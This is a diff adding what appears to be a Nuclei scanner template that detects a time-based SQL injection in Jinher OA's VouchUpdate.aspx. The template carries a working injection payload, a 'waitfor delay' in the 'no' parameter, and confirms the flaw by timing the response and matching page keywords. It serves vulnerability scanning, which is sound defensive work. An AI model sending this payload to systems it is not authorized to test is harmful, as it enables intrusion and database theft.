@@ -1,0 +1,33 @@
+id: poc-jinher-jhsoft-vouchupdate-aspx-sqli
+info:
+  name: Jinher OA VouchUpdate.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+  description: |
+    Jinher OA VouchUpdate.aspx is vulnerable to a SQL injection vulnerability via the 'no' parameter.
+
+variables:
+  t1: "{{rand_int(1, 5)}}"
+  t2: "{{to_number(t1) * 3}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CostControl/BudgetExecution/VouchUpdate.aspx/?no=1'waitfor+delay%270:0:{{t1}}%27--&type=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "修改凭证"
+          - "现金流项目"
+          - "费用科目"
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= to_number(t2)"
+          - "duration <= to_number(t3)"
